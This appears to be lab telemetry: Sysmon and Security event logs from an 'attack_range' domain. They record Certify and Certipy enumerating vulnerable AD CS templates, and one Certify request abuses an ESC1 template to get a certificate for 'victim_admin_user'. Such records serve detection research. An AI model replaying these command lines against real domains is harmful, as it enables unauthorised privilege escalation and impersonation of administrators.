<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:33:29.0389267Z'/><EventRecordID>3206407</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:32:29.024</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609103228_Certipy.json</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:33.024</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:33:29.0381103Z'/><EventRecordID>3206406</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:32:29.024</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609103228_Certipy.txt</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:33.024</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:32:28.4834561Z'/><EventRecordID>3206405</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:32:28.482</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609103228_templates.json</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:32.482</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:32:28.4819463Z'/><EventRecordID>3206404</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:32:28.466</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609103228_cas.json</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:32.466</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:32:28.4816688Z'/><EventRecordID>3206403</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:32:28.466</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609103228_Certipy.zip</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:32.466</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:31:57.1240923Z'/><EventRecordID>3206068</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:31:57.120</Data><Data Name='ProcessGuid'>{78198d03-37dd-6483-0bba-a00c00000000}</Data><Data Name='ProcessId'>11820</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>certipy.exe  find -username attack_user@attack_range.local</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-d21f-6480-255a-0b0000000000}</Data><Data Name='LogonId'>0xb5a25</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=7A7DC777AD1EB059A120F382155497CB,SHA256=21AD41408CA97A5F8830AC482686F4F3E5A85A35B93808DEBC542F48D68D8812,IMPHASH=BA5546933531FAFA869B1F86A4E2A959</Data><Data Name='ParentProcessGuid'>{78198d03-34c7-6483-ce87-910c00000000}</Data><Data Name='ParentProcessId'>12196</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>
#Certify
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4887</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:28:11.171703300Z'/><EventRecordID>1830974209</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>5</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data><Data Name='Disposition'>3</Data><Data Name='SubjectKeyIdentifier'>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0A</Data><Data Name='Subject'>CN=attack_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4886</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:28:10.2266761Z'/><EventRecordID>1830974207</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>5</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:27:01.9249918Z'/><EventRecordID>3206013</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:27:01.920</Data><Data Name='ProcessGuid'>{78198d03-36b5-6483-0e83-980c00000000}</Data><Data Name='ProcessId'>5672</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\Certify.exe</Data><Data Name='FileVersion'>1.0.0.0</Data><Data Name='Description'>Certify</Data><Data Name='Product'>Certify</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>Certify.exe</Data><Data Name='CommandLine'>Certify.exe  request /ca:"cert_authority.attack_range.local\Attack Range Cert Authority" /template:"cert_authority.attack_range.local\Attack Range Cert Authority" /altuser:victim_admin_user</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-d21f-6480-255a-0b0000000000}</Data><Data Name='LogonId'>0xb5a25</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=C0552C81E78CDE0A3DB009DB32024FD7,SHA256=DB31650DC56C928D71F1EC0E8CBD6AE56849BF334D121F9BB9CE41090A23171D,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744</Data><Data Name='ParentProcessGuid'>{78198d03-34c7-6483-ce87-910c00000000}</Data><Data Name='ParentProcessId'>12196</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:23:44.9160739Z'/><EventRecordID>3206009</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:23:44.911</Data><Data Name='ProcessGuid'>{78198d03-35f0-6483-3e9c-950c00000000}</Data><Data Name='ProcessId'>5012</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\Certify.exe</Data><Data Name='FileVersion'>1.0.0.0</Data><Data Name='Description'>Certify</Data><Data Name='Product'>Certify</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>Certify.exe</Data><Data Name='CommandLine'>Certify.exe  find /enrolleeSuppliesSubject</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-d21f-6480-255a-0b0000000000}</Data><Data Name='LogonId'>0xb5a25</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=C0552C81E78CDE0A3DB009DB32024FD7,SHA256=DB31650DC56C928D71F1EC0E8CBD6AE56849BF334D121F9BB9CE41090A23171D,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744</Data><Data Name='ParentProcessGuid'>{78198d03-34c7-6483-ce87-910c00000000}</Data><Data Name='ParentProcessId'>12196</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:22:34.3194327Z'/><EventRecordID>3206008</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:22:34.315</Data><Data Name='ProcessGuid'>{78198d03-35aa-6483-ecfe-930c00000000}</Data><Data Name='ProcessId'>17404</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\Certify.exe</Data><Data Name='FileVersion'>1.0.0.0</Data><Data Name='Description'>Certify</Data><Data Name='Product'>Certify</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>Certify.exe</Data><Data Name='CommandLine'>Certify.exe  find /vulnerable</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-d21f-6480-255a-0b0000000000}</Data><Data Name='LogonId'>0xb5a25</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=C0552C81E78CDE0A3DB009DB32024FD7,SHA256=DB31650DC56C928D71F1EC0E8CBD6AE56849BF334D121F9BB9CE41090A23171D,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744</Data><Data Name='ParentProcessGuid'>{78198d03-34c7-6483-ce87-910c00000000}</Data><Data Name='ParentProcessId'>12196</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:21:33.5321737Z'/><EventRecordID>3206007</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>ProcessHostingdotNETCode</Data><Data Name='UtcTime'>2023-06-09 14:21:33.518</Data><Data Name='ProcessGuid'>{78198d03-356d-6483-3c41-930c00000000}</Data><Data Name='ProcessId'>20144</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\Certify.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\Certify.exe.log</Data><Data Name='CreationUtcTime'>2023-06-08 12:34:22.906</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:21:33.4954865Z'/><EventRecordID>3206006</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:21:33.490</Data><Data Name='ProcessGuid'>{78198d03-356d-6483-3c41-930c00000000}</Data><Data Name='ProcessId'>20144</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\Certify.exe</Data><Data Name='FileVersion'>1.0.0.0</Data><Data Name='Description'>Certify</Data><Data Name='Product'>Certify</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>Certify.exe</Data><Data Name='CommandLine'>Certify.exe</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-d21f-6480-255a-0b0000000000}</Data><Data Name='LogonId'>0xb5a25</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=C0552C81E78CDE0A3DB009DB32024FD7,SHA256=DB31650DC56C928D71F1EC0E8CBD6AE56849BF334D121F9BB9CE41090A23171D,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744</Data><Data Name='ParentProcessGuid'>{78198d03-34c7-6483-ce87-910c00000000}</Data><Data Name='ParentProcessId'>12196</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>


